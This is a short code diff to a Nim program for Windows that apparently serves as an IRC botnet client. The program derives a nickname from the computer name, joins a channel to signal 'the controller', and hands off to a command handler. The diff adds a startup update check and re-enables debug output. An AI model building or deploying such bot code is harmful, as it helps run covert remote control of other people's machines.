@@ -2,6 +2,9 @@ import irc, winim, random, strutils
 
 import command_handler, update_handler
 
+# Check for updates
+updt_check()
+
 var
     name_buffer: array[0..15, WCHAR]
     name_size : DWORD
@@ -19,7 +22,7 @@ for i in 0..<len(name_buffer):
     else:
         break
 
-#if g_dbg: echo "ComputerName: ", name
+if g_dbg: echo "ComputerName: ", name
 
 ## The final nickname must be 16 chars long so the rest will be filled with random digits
 randomize()
@@ -48,4 +51,4 @@ while true:
         ## Notify the controller that the bot has joined
         client.privmsg(target_channel,".")
       
-      #if g_dbg: echo(event.raw)
+      if g_dbg: echo(event.raw)
